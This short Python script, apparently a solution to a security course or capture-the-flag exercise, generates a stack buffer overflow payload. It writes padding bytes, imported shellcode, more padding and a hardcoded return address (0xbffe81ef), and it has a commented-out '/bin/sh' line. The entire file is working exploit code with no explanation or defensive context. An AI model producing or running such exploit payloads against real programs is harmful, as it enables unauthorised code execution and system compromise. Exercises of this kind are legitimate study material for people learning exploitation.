import sys

from struct import pack
from shellcode import shellcode

#sys.stdout.buffer.write(shellcode)

#for i in range(0, 1033):
#	# sys.stdout.buffer.write(pack("<I", 0x90))
#	sys.stdout.buffer.write(b"\x90")
#
sys.stdout.buffer.write(b"\x90")
for i in range(0, 516):
	sys.stdout.buffer.write(pack("<I", 0x00000090)) # buffer
sys.stdout.buffer.write(shellcode)
for i in range(0, 516):
        sys.stdout.buffer.write(pack("<I", 0x11)) # buffer
# sys.stdout.buffer.write(pack("<I", 0x080488b3)) 
sys.stdout.buffer.write(pack("<I", 0xbffe81ef))
sys.stdout.buffer.write(pack("<I", 0xbffe81ef))

# sys.stdout.buffer.write(b'/bin/sh')

